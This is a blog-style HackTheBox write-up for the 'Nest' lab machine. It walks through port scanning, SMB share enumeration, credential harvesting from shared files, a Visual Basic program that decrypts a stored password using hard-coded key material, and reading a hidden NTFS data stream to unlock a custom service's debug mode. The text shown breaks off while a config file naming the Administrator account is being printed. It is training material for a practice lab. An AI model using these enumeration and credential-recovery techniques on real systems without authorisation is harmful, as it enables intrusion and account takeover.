---
title: "HackTheBox Writeup: Nest"
date: 2020-07-20T00:06:56+02:00
tags:
  - hackthebox
  - ctf
  - writeup
showdate: true
toc: true
---

Nest suffered from the unfortunate fate of being vulnerable to a couple unwanted instant root paths that took both first bloods in a matter of minutes, so a lot of people missed the intended route which actually turned out to be original, creative, and in my opinion a lot of fun. So kudos to VbScrub for this neat little challenge.

In short, there's a custom application running on a high port that allows to navigate a decent amount of the filesystem but requires a password to read any files, at the end of the day this box is all a matter of careful enumeration, exploration, and "analysis" (or copy and pasting).

Overall, I found myself enjoying this box very much.

![img](/images/writeup-nest/1.png)

---

## Surface scan

A scan of the first 1000 ports with nmap only shows SMB running on its usual port:

```aaa
┌─[baud@parrot]─[~/HTB/nest]
└──╼ $sudo nmap -sV -sC -oA nmapScan 10.10.10.178
[sudo] password for baud: 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-02 19:05 CET
Nmap scan report for 10.10.10.178
Host is up (0.036s latency).
Not shown: 999 filtered ports
PORT    STATE SERVICE       VERSION
445/tcp open  microsoft-ds?

Host script results:
|_clock-skew: 1m32s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-02-02T18:07:03
|_  start_date: 2020-02-02T13:01:01

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 54.25 seconds
```

To make a quick check of the higher ports I run masscan with the whole TCP port range and discovered a new service listening on port 4386, a very unusual port number:

```aaa
┌─[baud@parrot]─[~/HTB/nest]
└──╼ $sudo masscan -p1-65535 --rate=1000 -e tun0 10.10.10.178

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-02-02 18:07:55 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
Discovered open port 445/tcp on 10.10.10.178                                   
Discovered open port 4386/tcp on 10.10.10.178
```

Before connecting to it I gave that port to nmap to see if it could recognize the program running behind it, but it turns out to be a custom program that nmap doesn't know:

```aaa
┌─[baud@parrot]─[~/HTB/nest]
└──╼ $sudo nmap -sC -sV -p 4386 -oA mysteryPort 10.10.10.178
[sudo] password for baud: 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-02 19:10 CET
Nmap scan report for 10.10.10.178
Host is up (0.049s latency).

PORT     STATE SERVICE VERSION
4386/tcp open  unknown
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
|     Reporting Service V1.2
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     Reporting Service V1.2
|     Unrecognised command
|   Help: 
|     Reporting Service V1.2
|     This service allows users to run queries against databases using the legacy HQK format
|     AVAILABLE COMMANDS ---
|     LIST
|     SETDIR <Directory_Name>
|     RUNQUERY <Query_ID>
|     DEBUG <Password>
|_    HELP <Command>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4386-TCP:V=7.80%I=7%D=2/2%Time=5E371084%P=x86_64-pc-linux-gnu%r(NUL
SF:L,21,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(GenericLine
SF:s,3A,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>\r\nUnrecognised
SF:\x20command\r\n>")%r(GetRequest,3A,"\r\nHQK\x20Reporting\x20Service\x20
SF:V1\.2\r\n\r\n>\r\nUnrecognised\x20command\r\n>")%r(HTTPOptions,3A,"\r\n
SF:HQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>\r\nUnrecognised\x20comman
SF:d\r\n>")%r(RTSPRequest,3A,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n
SF:\r\n>\r\nUnrecognised\x20command\r\n>")%r(RPCCheck,21,"\r\nHQK\x20Repor
SF:ting\x20Service\x20V1\.2\r\n\r\n>")%r(DNSVersionBindReqTCP,21,"\r\nHQK\
SF:x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(DNSStatusRequestTCP,21,"\
SF:r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(Help,F2,"\r\nHQK\x
SF:20Reporting\x20Service\x20V1\.2\r\n\r\n>\r\nThis\x20service\x20allows\x
SF:20users\x20to\x20run\x20queries\x20against\x20databases\x20using\x20the
SF:\x20legacy\x20HQK\x20format\r\n\r\n---\x20AVAILABLE\x20COMMANDS\x20---\
SF:r\n\r\nLIST\r\nSETDIR\x20<Directory_Name>\r\nRUNQUERY\x20<Query_ID>\r\n
SF:DEBUG\x20<Password>\r\nHELP\x20<Command>\r\n>")%r(SSLSessionReq,21,"\r\
SF:nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(TerminalServerCookie
SF:,21,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(TLSSessionRe
SF:q,21,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(Kerberos,21
SF:,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(SMBProgNeg,21,"
SF:\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(X11Probe,21,"\r\n
SF:HQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(FourOhFourRequest,3A,
SF:"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>\r\nUnrecognised\x20c
SF:ommand\r\n>")%r(LPDString,21,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\
SF:r\n\r\n>")%r(LDAPSearchReq,21,"\r\nHQK\x20Reporting\x20Service\x20V1\.2
SF:\r\n\r\n>")%r(LDAPBindReq,21,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\
SF:r\n\r\n>")%r(SIPOptions,3A,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\
SF:n\r\n>\r\nUnrecognised\x20command\r\n>")%r(LANDesk-RC,21,"\r\nHQK\x20Re
SF:porting\x20Service\x20V1\.2\r\n\r\n>")%r(TerminalServer,21,"\r\nHQK\x20
SF:Reporting\x20Service\x20V1\.2\r\n\r\n>");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 159.27 seconds
```

---

## HQK Reporting Service part 1: first look

At this point I investigate manually by connecting to that port with telnet, and I find myself in front of some kind of querying program that offers a few different commands.

The help command gives a list of supported keywords to be used within the application, plus it can give more details on each single command with the syntax *help -command-*:

```aaa
┌─[baud@parrot]─[~/HTB/nest]                                                 
└──╼ $telnet 10.10.10.178 4386
Trying 10.10.10.178...
Connected to 10.10.10.178.
Escape character is '^]'.

HQK Reporting Service V1.2

>help

This service allows users to run queries against databases using the legacy HQK format

--- AVAILABLE COMMANDS ---

LIST
SETDIR <Directory_Name>
RUNQUERY <Query_ID>
DEBUG <Password>
HELP <Command>
>
```

*list* is basically a *dir* and *ls* type of command, it shows the content of the current folder. The program refers to the output as query files, but in reality the program will show every file in the folder regardless of the extension, plus a number for each to use with the *runquery* command:

```aaa
>list

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[DIR]  COMPARISONS
[1]   Invoices (Ordered By Customer)
[2]   Products Sold (Ordered By Customer)
[3]   Products Sold In Last 30 Days

Current Directory: ALL QUERIES
>
```

The filesystem can be navigated using *setdir*:

```aaa
>help setdir


SETDIR <Directory>
Selects a new directory where query files can be run from. Use the LIST command to view available directory names (marked with [DIR]) that can be used with this command. The special characters ".." can be used to go back upto the previous directory.

Examples:
SETDIR MY QUERIES       Changes to the directory named "MY QUERIES"
SETDIR ..               Changes to the parent directory of the current directory
```

Much like *cd* the .. notation can take the current directory up through the hierarchy:

```aaa
>setdir ..

Current directory set to HQK
>list

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[DIR]  ALL QUERIES
[DIR]  LDAP
[DIR]  Logs
[1]   HqkSvc.exe
[2]   HqkSvc.InstallState
[3]   HQK_Config.xml

Current Directory: HQK
```

Seeing that we can explore the disk a bit I thought perhaps we could read some interesting files with the *showquery* command, however this command is disabled by default and requires debug mode to be enabled, and this can only be enabled with the debug password:

```aaa
>showquery 3

Debug mode must be enabled to run this command
```

I did a few attempts at guessing the password but to no avail:

```aaa
>debug password

Invalid password entered
```

And on top of that, the *runquery* command does not work in the first place, so we can't execute any queries either:

```aaa
>runquery 1

Invalid database configuration found. Please contact your system administrator
```

---

## Exploring SMB shares

Seeing that there's nothing else I can do on this program I move on to SMB, listing the available shares and finding three non-default ones, Data, Secure$, Users:

```aaa
┌─[baud@parrot]─[~/HTB/nest]
└──╼ $smbclient -L 10.10.10.178
Unable to initialize messaging context
Enter WORKGROUP\baud's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	Data            Disk      
	IPC$            IPC       Remote IPC
	Secure$         Disk      
	Users           Disk      
SMB1 disabled -- no workgroup available
```

The only one I could explore without authentication was Data, which has a lot of different folders with many pretty useless files.

The first interesting one I run into is Welcome Email.txt:

```aaa
smb: \shared\templates\hr\> dir
  .                                   D        0  Wed Aug  7 21:08:01 2019
  ..                                  D        0  Wed Aug  7 21:08:01 2019
  Welcome Email.txt                   A      425  Thu Aug  8 00:55:36 2019

		10485247 blocks of size 4096. 6449630 blocks available
smb: \shared\templates\hr\> get "Welcome Email.txt"
getting file \shared\templates\hr\Welcome Email.txt of size 425 as Welcome Email.txt (2.2 KiloBytes/sec) (average 1.3 KiloBytes/sec)
```

It's an email template for new employees, and it mentions the credentials of a temporary user to use in case of necessity:

```aaa
┌─[baud@parrot]─[~/HTB/nest]
└──╼ $cat "Welcome Email.txt"
We would like to extend a warm welcome to our newest member of staff, <FIRSTNAME> <SURNAME>

You will find your home folder in the following location: 
\\HTB-NEST\Users\<USERNAME>

If you have any issues accessing specific services or workstations, please inform the 
IT department and use the credentials below until all systems have been set up for you.

Username: TempUser
Password: welcome2019


Thank you
HR
```

So the first pair of credentials for the box is:

```aaa
User: TempUser
Pass: welcome2019
```

Doing as the email said I logged into the Users share using the TempUser account:

```aaa
┌─[baud@parrot]─[~/HTB/nest]
└──╼ $smbclient //10.10.10.178/Users -U TempUser
Unable to initialize messaging context
Enter WORKGROUP\TempUser's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Jan 26 00:04:21 2020
  ..                                  D        0  Sun Jan 26 00:04:21 2020
  Administrator                       D        0  Fri Aug  9 17:08:23 2019
  C.Smith                             D        0  Sun Jan 26 08:21:44 2020
  L.Frost                             D        0  Thu Aug  8 19:03:01 2019
  R.Thompson                          D        0  Thu Aug  8 19:02:50 2019
  TempUser                            D        0  Thu Aug  8 00:55:56 2019

		10485247 blocks of size 4096. 6449630 blocks available
smb: \> 
```

But it appears to be completely empty besides an empty text file:

```aaa
smb: \tempuser\> dir
  .                                   D        0  Thu Aug  8 00:55:56 2019
  ..                                  D        0  Thu Aug  8 00:55:56 2019
  New Text Document.txt               A        0  Thu Aug  8 00:55:56 2019

		10485247 blocks of size 4096. 6449630 blocks available
```

However I am able to look further in the Data share, reaching the Configs directory:

```aaa
┌─[baud@parrot]─[~/HTB/nest]
└──╼ $smbclient //10.10.10.178/Data -U TempUser
Unable to initialize messaging context
Enter WORKGROUP\TempUser's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Aug  8 00:53:46 2019
  ..                                  D        0  Thu Aug  8 00:53:46 2019
  IT                                  D        0  Thu Aug  8 00:58:07 2019
  Production                          D        0  Mon Aug  5 23:53:38 2019
  Reports                             D        0  Mon Aug  5 23:53:44 2019
  Shared                              D        0  Wed Aug  7 21:07:51 2019

		10485247 blocks of size 4096. 6449630 blocks available
smb: \> cd it
smb: \it\> dir
  .                                   D        0  Thu Aug  8 00:58:07 2019
  ..                                  D        0  Thu Aug  8 00:58:07 2019
  Archive                             D        0  Tue Aug  6 00:33:58 2019
  Configs                             D        0  Thu Aug  8 00:59:34 2019
  Installs                            D        0  Thu Aug  8 00:08:30 2019
  Reports                             D        0  Sun Jan 26 01:09:13 2020
  Tools                               D        0  Tue Aug  6 00:33:43 2019

		10485247 blocks of size 4096. 6449630 blocks available
```

Here lies the directory of some custom program of which I can gather the XML config file:

```aaa
smb: \it\configs\ru scanner\> dir
  .                                   D        0  Wed Aug  7 22:01:13 2019
  ..                                  D        0  Wed Aug  7 22:01:13 2019
  RU_config.xml                       A      270  Thu Aug  8 21:49:37 2019

		10485247 blocks of size 4096. 6449630 blocks available
```

It contains the encrypted password of the c.smith account, however not knowing the encryption algorithm, key, or any other variables yet I can only write this down for later and keep exploring:

```xml
<?xml version="1.0"?>
<ConfigFile xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <Port>389</Port>
  <Username>c.smith</Username>
  <Password>fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=</Password>
</ConfigFile>
```

Always in the Configs directory there is a Notepad++ config file that leaks a path from the Secure$ share that takes to a txt file:

```aaa
[...]
   <History nbMaxFile="15" inSubMenu="no" customLength="-1">
        <File filename="C:\windows\System32\drivers\etc\hosts" />
        <File filename="\\HTB-NEST\Secure$\IT\Carl\Temp.txt" />
        <File filename="C:\Users\C.Smith\Desktop\todo.txt" />
    </History>
</NotepadPlus>
```

I was completely ignoring the Secure$ share because upon trying listing files earlier I got access denied errors in every directory, but now that I know about the existence of two subfolders I can verify that indeed I have the rights to access the share and its subdirectories, the admin just took my listing rights away and left the read ones:

```aaa
┌─[✗]─[baud@parrot]─[~/HTB/nest]
└──╼ $smbclient -U tempuser \\\\10.10.10.178\\secure$
Enter WORKGROUP\tempuser's password: 
Try "help" to get a list of possible commands.
smb: \> cd it
smb: \it\> cd carl
smb: \it\carl\> dir
  .                                   D        0  Wed Aug  7 21:42:14 2019
  ..                                  D        0  Wed Aug  7 21:42:14 2019
  Docs                                D        0  Wed Aug  7 21:44:00 2019
  Reports                             D        0  Tue Aug  6 15:45:40 2019
  VB Projects                         D        0  Tue Aug  6 16:41:55 2019

		10485247 blocks of size 4096. 6545353 blocks available
smb: \it\carl\> cd ..
smb: \it\> dir
NT_STATUS_ACCESS_DENIED listing \it\*
```

The only interesting files in here belong to a Visual Basic project:

```aaa
smb: \it\carl\vb projects\wip\ru\ruscanner\> dir
  .                                   D        0  Thu Aug  8 00:05:54 2019
  ..                                  D        0  Thu Aug  8 00:05:54 2019
  bin                                 D        0  Wed Aug  7 22:00:11 2019
  ConfigFile.vb                       A      772  Thu Aug  8 00:05:09 2019
  Module1.vb                          A      279  Thu Aug  8 00:05:44 2019
  My Project                          D        0  Wed Aug  7 22:00:11 2019
  obj                                 D        0  Wed Aug  7 22:00:11 2019
  RU Scanner.vbproj                   A     4828  Fri Aug  9 17:37:51 2019
  RU Scanner.vbproj.user              A      143  Tue Aug  6 14:55:27 2019
  SsoIntegration.vb                   A      133  Thu Aug  8 00:05:58 2019
  Utils.vb                            A     4888  Wed Aug  7 21:49:35 2019

		10485247 blocks of size 4096. 6545353 blocks available
```

I made a local copy with smbget so that I could analyze it with more care in a Windows environment with Visual Studio installed:

```aaa
┌─[✗]─[baud@parrot]─[~/HTB/nest/project]
└──╼ $smbget -U tempuser -R "smb://10.10.10.178/secure$/it/carl/vb projects/wip/ru"
Password for [tempuser] connecting to //secure$/10.10.10.178: 
Using workgroup WORKGROUP, user tempuser
smb://10.10.10.178/secure$/it/carl/vb projects/wip/ru/RUScanner/ConfigFile.vb                                        
smb://10.10.10.178/secure$/it/carl/vb projects/wip/ru/RUScanner/Module1.vb                                           
smb://10.10.10.178/secure$/it/carl/vb projects/wip/ru/RUScanner/My Project/Application.Designer.vb                   
smb://10.10.10.178/secure$/it/carl/vb projects/wip/ru/RUScanner/My Project/Application.myapp                         
smb://10.10.10.178/secure$/it/carl/vb projects/wip/ru/RUScanner/My Project/AssemblyInfo.vb                           
smb://10.10.10.178/secure$/it/carl/vb projects/wip/ru/RUScanner/My Project/Resources.Designer.vb                     
smb://10.10.10.178/secure$/it/carl/vb projects/wip/ru/RUScanner/My Project/Resources.resx                            
smb://10.10.10.178/secure$/it/carl/vb projects/wip/ru/RUScanner/My Project/Settings.Designer.vb                      
smb://10.10.10.178/secure$/it/carl/vb projects/wip/ru/RUScanner/My Project/Settings.settings                         
smb://10.10.10.178/secure$/it/carl/vb projects/wip/ru/RUScanner/RU Scanner.vbproj                                    
smb://10.10.10.178/secure$/it/carl/vb projects/wip/ru/RUScanner/RU Scanner.vbproj.user                               
smb://10.10.10.178/secure$/it/carl/vb projects/wip/ru/RUScanner/SsoIntegration.vb                                    
smb://10.10.10.178/secure$/it/carl/vb projects/wip/ru/RUScanner/Utils.vb                                             
smb://10.10.10.178/secure$/it/carl/vb projects/wip/ru/RUScanner.sln                                                  
Downloaded 25.05kB in 7 seconds
```

And zipped it up for easier transfer:

```aaa
┌─[✗]─[baud@parrot]─[~/HTB/nest/project]
└──╼ $zip -r vbProject.zip *
  adding: RUScanner/ (stored 0%)
  adding: RUScanner/bin/ (stored 0%)
  adding: RUScanner/bin/Debug/ (stored 0%)
  adding: RUScanner/bin/Release/ (stored 0%)
  adding: RUScanner/ConfigFile.vb (deflated 60%)
  adding: RUScanner/Module1.vb (deflated 35%)
  adding: RUScanner/My Project/ (stored 0%)
  adding: RUScanner/My Project/Application.Designer.vb (deflated 55%)
  adding: RUScanner/My Project/Application.myapp (deflated 48%)
  adding: RUScanner/My Project/AssemblyInfo.vb (deflated 54%)
  adding: RUScanner/My Project/Resources.Designer.vb (deflated 66%)
  adding: RUScanner/My Project/Resources.resx (deflated 74%)
  adding: RUScanner/My Project/Settings.Designer.vb (deflated 69%)
  adding: RUScanner/My Project/Settings.settings (deflated 30%)
  adding: RUScanner/obj/ (stored 0%)
  adding: RUScanner/obj/x86/ (stored 0%)
  adding: RUScanner/RU Scanner.vbproj (deflated 72%)
  adding: RUScanner/RU Scanner.vbproj.user (deflated 10%)
  adding: RUScanner/SsoIntegration.vb (deflated 33%)
  adding: RUScanner/Utils.vb (deflated 80%)
  adding: RUScanner.sln (deflated 60%)
```

---

## VB analysis and decryption program #1

Visual Studio loads four different source files belonging to the project solution:

![img](/images/writeup-nest/2.png)

Most of them are practically empty, the only interesting one appears to be Utils.vb which contains two crypto functions, Encrypt and Decrypt:

```vb
Public Shared Function Encrypt(ByVal plainText As String, _
                                   ByVal passPhrase As String, _
                                   ByVal saltValue As String, _
                                    ByVal passwordIterations As Integer, _
                                   ByVal initVector As String, _
                                   ByVal keySize As Integer) _
                           As String

        Dim initVectorBytes As Byte() = Encoding.ASCII.GetBytes(initVector)
        Dim saltValueBytes As Byte() = Encoding.ASCII.GetBytes(saltValue)
        Dim plainTextBytes As Byte() = Encoding.ASCII.GetBytes(plainText)
        Dim password As New Rfc2898DeriveBytes(passPhrase, _
                                           saltValueBytes, _
                                           passwordIterations)
        Dim keyBytes As Byte() = password.GetBytes(CInt(keySize / 8))
        Dim symmetricKey As New AesCryptoServiceProvider
        symmetricKey.Mode = CipherMode.CBC
        Dim encryptor As ICryptoTransform = symmetricKey.CreateEncryptor(keyBytes, initVectorBytes)
        Using memoryStream As New IO.MemoryStream()
            Using cryptoStream As New CryptoStream(memoryStream, _
                                            encryptor, _
                                            CryptoStreamMode.Write)
                cryptoStream.Write(plainTextBytes, 0, plainTextBytes.Length)
                cryptoStream.FlushFinalBlock()
                Dim cipherTextBytes As Byte() = memoryStream.ToArray()
                memoryStream.Close()
                cryptoStream.Close()
                Return Convert.ToBase64String(cipherTextBytes)
            End Using
        End Using
    End Function

    Public Shared Function Decrypt(ByVal cipherText As String, _
                                   ByVal passPhrase As String, _
                                   ByVal saltValue As String, _
                                    ByVal passwordIterations As Integer, _
                                   ByVal initVector As String, _
                                   ByVal keySize As Integer) _
                           As String

        Dim initVectorBytes As Byte()
        initVectorBytes = Encoding.ASCII.GetBytes(initVector)

        Dim saltValueBytes As Byte()
        saltValueBytes = Encoding.ASCII.GetBytes(saltValue)

        Dim cipherTextBytes As Byte()
        cipherTextBytes = Convert.FromBase64String(cipherText)

        Dim password As New Rfc2898DeriveBytes(passPhrase, _
                                           saltValueBytes, _
                                           passwordIterations)

        Dim keyBytes As Byte()
        keyBytes = password.GetBytes(CInt(keySize / 8))

        Dim symmetricKey As New AesCryptoServiceProvider
        symmetricKey.Mode = CipherMode.CBC

        Dim decryptor As ICryptoTransform
        decryptor = symmetricKey.CreateDecryptor(keyBytes, initVectorBytes)

        Dim memoryStream As IO.MemoryStream
        memoryStream = New IO.MemoryStream(cipherTextBytes)

        Dim cryptoStream As CryptoStream
        cryptoStream = New CryptoStream(memoryStream, _
                                        decryptor, _
                                        CryptoStreamMode.Read)

        Dim plainTextBytes As Byte()
        ReDim plainTextBytes(cipherTextBytes.Length)

        Dim decryptedByteCount As Integer
        decryptedByteCount = cryptoStream.Read(plainTextBytes, _
                                               0, _
                                               plainTextBytes.Length)

        memoryStream.Close()
        cryptoStream.Close()

        Dim plainText As String
        plainText = Encoding.ASCII.GetString(plainTextBytes, _
                                            0, _
                                            decryptedByteCount)

        Return plainText
    End Function
```

These functions also have a wrapper that calls them by providing the right parameters, either a plain text string / cipher text, IV, encryption key, salt, and key length, which are all hard coded in the function calls:

```vb
Public Shared Function DecryptString(EncryptedString As String) As String
        If String.IsNullOrEmpty(EncryptedString) Then
            Return String.Empty
        Else
            Return Decrypt(EncryptedString, "N3st22", "88552299", 2, "464R5DFA5DL6LE28", 256)
        End If
    End Function

    Public Shared Function EncryptString(PlainString As String) As String
        If String.IsNullOrEmpty(PlainString) Then
            Return String.Empty
        Else
            Return Encrypt(PlainString, "N3st22", "88552299", 2, "464R5DFA5DL6LE28", 256)
        End If
    End Function
```

I can copy and paste the Decrypt and DecryptString functions in a new project and feed them the encrypted string found earlier to easily make a decryption program with little work:

```vb
Imports System
Imports System.Text
Imports System.Security.Cryptography

Module Program
    Public Function DecryptString(EncryptedString As String) As String
        If String.IsNullOrEmpty(EncryptedString) Then
            Return String.Empty
        Else
            Return Decrypt(EncryptedString, "N3st22", "88552299", 2, "464R5DFA5DL6LE28", 256)
        End If
    End Function

    Public Function Decrypt(ByVal cipherText As String,
                                   ByVal passPhrase As String,
                                   ByVal saltValue As String,
                                    ByVal passwordIterations As Integer,
                                   ByVal initVector As String,
                                   ByVal keySize As Integer) _
                           As String

        Dim initVectorBytes As Byte()
        initVectorBytes = Encoding.ASCII.GetBytes(initVector)

        Dim saltValueBytes As Byte()
        saltValueBytes = Encoding.ASCII.GetBytes(saltValue)

        Dim cipherTextBytes As Byte()
        cipherTextBytes = Convert.FromBase64String(cipherText)

        Dim password As New Rfc2898DeriveBytes(passPhrase,
                                           saltValueBytes,
                                           passwordIterations)

        Dim keyBytes As Byte()
        keyBytes = password.GetBytes(CInt(keySize / 8))

        Dim symmetricKey As New AesCryptoServiceProvider
        symmetricKey.Mode = CipherMode.CBC

        Dim decryptor As ICryptoTransform
        decryptor = symmetricKey.CreateDecryptor(keyBytes, initVectorBytes)

        Dim memoryStream As IO.MemoryStream
        memoryStream = New IO.MemoryStream(cipherTextBytes)

        Dim cryptoStream As CryptoStream
        cryptoStream = New CryptoStream(memoryStream,
                                        decryptor,
                                        CryptoStreamMode.Read)

        Dim plainTextBytes As Byte()
        ReDim plainTextBytes(cipherTextBytes.Length)

        Dim decryptedByteCount As Integer
        decryptedByteCount = cryptoStream.Read(plainTextBytes,
                                               0,
                                               plainTextBytes.Length)

        memoryStream.Close()
        cryptoStream.Close()

        Dim plainText As String
        plainText = Encoding.ASCII.GetString(plainTextBytes,
                                            0,
                                            decryptedByteCount)

        Return plainText
    End Function

    Sub Main(args As String())
        Console.WriteLine("----- HackTheBox Nested Decryption program by Baud -----")
        Console.WriteLine("Clear text c.smith password: " + DecryptString("fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE="))
        Console.ReadLine()
    End Sub
End Module
```

The program outputs the clear text password:

![img](/images/writeup-nest/3.png)

So the credentials for the c.smith account turn out to be:

```aaa
User: c.smith
Pass: xRxRxPANCAK3SxRxRx
```

---

## First flag and hidden debug password

With these it is now possible to log into the Users share as the c.smith account and have access to its directory, which contains the user.txt flag and a folder that appears to be related to the custom software found in the other open port:

```aaa
┌─[✗]─[baud@parrot]─[/mnt/secure]
└──╼ $smbclient -U c.smith \\\\10.10.10.178\\users
Enter WORKGROUP\c.smith's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Jan 26 00:04:21 2020
  ..                                  D        0  Sun Jan 26 00:04:21 2020
  Administrator                       D        0  Fri Aug  9 17:08:23 2019
  C.Smith                             D        0  Sun Jan 26 08:21:44 2020
  L.Frost                             D        0  Thu Aug  8 19:03:01 2019
  R.Thompson                          D        0  Thu Aug  8 19:02:50 2019
  TempUser                            D        0  Thu Aug  8 00:55:56 2019

		10485247 blocks of size 4096. 6545353 blocks available
smb: \> cd c.smith
smb: \c.smith\> dir
  .                                   D        0  Sun Jan 26 08:21:44 2020
  ..                                  D        0  Sun Jan 26 08:21:44 2020
  HQK Reporting                       D        0  Fri Aug  9 01:06:17 2019
  user.txt                            A       32  Fri Aug  9 01:05:24 2019

		10485247 blocks of size 4096. 6545353 blocks available
```

I downloaded all these files too and saw that there is only an XML file, an executable, and a text document:

```aaa
┌─[baud@parrot]─[~/HTB/nest]
└──╼ $smbget -U c.smith -R "smb://10.10.10.178/Users/c.smith/HQK Reporting"
Password for [c.smith] connecting to //Users/10.10.10.178: 
Using workgroup WORKGROUP, user c.smith
smb://10.10.10.178/Users/c.smith/HQK Reporting/AD Integration Module/HqkLdap.exe                                     
smb://10.10.10.178/Users/c.smith/HQK Reporting/Debug Mode Password.txt                                               
smb://10.10.10.178/Users/c.smith/HQK Reporting/HQK_Config_Backup.xml                                                 
Downloaded 17.24kB in 9 seconds
```

The text file claims to contain the password for debug mode seen in the service running on the high port, but it seems to be completely empty, the size of the file is 0 bytes.

However if I take a better look at it after mounting the share from Windows I can see it has an alternate data stream called Password in it, other than the default $DATA stream:

```aaa
Y:\C.Smith\HQK Reporting>dir /R
 Volume in drive Y has no label.
 Volume Serial Number is 2C6F-6A14

 Directory of Y:\C.Smith\HQK Reporting

08/09/2019  12:06 AM    <DIR>          .
08/09/2019  12:06 AM    <DIR>          ..
08/09/2019  01:18 PM    <DIR>          AD Integration Module
08/09/2019  12:08 AM                 0 Debug Mode Password.txt
                                    15 Debug Mode Password.txt:Password:$DATA
08/09/2019  12:09 AM               249 HQK_Config_Backup.xml
               2 File(s)            249 bytes
               3 Dir(s)  26,809,094,144 bytes free
```

Assuming the stream is just a string of text like a password I can see its content by launching notepad and specifying the filename with a colon and the stream name appended to it:

```aaa
Y:\C.Smith\HQK Reporting>notepad "Debug Mode Password.txt:Password"
```

notepad.exe is happy to show me the debug password:

![img](/images/writeup-nest/4.png)

---

## HQK Reporting Service part 2: debug mode

With this password I can go back to that custom program and see what debug mode unlocks:

```aaa
Debug Pass: WBQ201953D8w
```

```aaa
┌─[baud@parrot]─[~/HTB/nest]
└──╼ $telnet 10.10.10.178 4386
Trying 10.10.10.178...
Connected to 10.10.10.178.
Escape character is '^]'.

HQK Reporting Service V1.2

>debug WBQ201953D8w

Debug mode enabled. Use the HELP command to view additional commands that are now available
>
```

Now the help command should give me a more complete list of available operations, two new ones have appeared, *service* and *session*:

```aaa
>help

This service allows users to run queries against databases using the legacy HQK format

--- AVAILABLE COMMANDS ---

LIST
SETDIR <Directory_Name>
RUNQUERY <Query_ID>
DEBUG <Password>
HELP <Command>
SERVICE
SESSION
SHOWQUERY <Query_ID>
```

They only show very little information about the program's running status, nothing worth taking note of:

```aaa
>session

--- Session Information ---

Session ID: 171c8ee9-ec62-43e1-94e9-511edc39efd0
Debug: True
Started At: 2/25/2020 1:06:22 PM
Server Endpoint: 10.10.10.178:4386
Client Endpoint: 10.10.14.144:57316
Current Query Directory: C:\Program Files\HQK\ALL QUERIES

>service

--- HQK REPORTING SERVER INFO ---

Version: 1.2.0.0
Server Hostname: HTB-NEST
Server Process: "C:\Program Files\HQK\HqkSvc.exe"
Server Running As: Service_HQK
Initial Query Directory: C:\Program Files\HQK\ALL QUERIES
```

Although the good thing is that now I can use *showquery* to see the content of some text files, as long as they aren't too big:

```xml
>showquery 3

<?xml version="1.0"?>
<ServiceSettings xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <Port>4386</Port>
  <DebugPassword>WBQ201953D8w</DebugPassword>
  <QueryDirectory>C:\Program Files\HQK\ALL QUERIES</QueryDirectory>
</ServiceSettings>
```

That was the config file for the program, but just by going back one level from the initial directory and then inside LDAP I find an executable called HqkLdap.exe and its own config file:

```aaa
>list

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[1]   HqkLdap.exe
[2]   Ldap.conf

Current Directory: ldap
```

Now, HqkLdap.exe is the same program that I found in c.smith's user folder, inside "AD Integration Module", so this file is particularly interesting. It contains a new pair of encrypted credentials, apparently for use with LDAP, and they belong to none other than the Administrator:

```aaa
>showquery 2

Domain=nest.local
Port=389
BaseOu=OU=WBQ Users,OU=Production,DC=nest,DC=local
User=Administrator
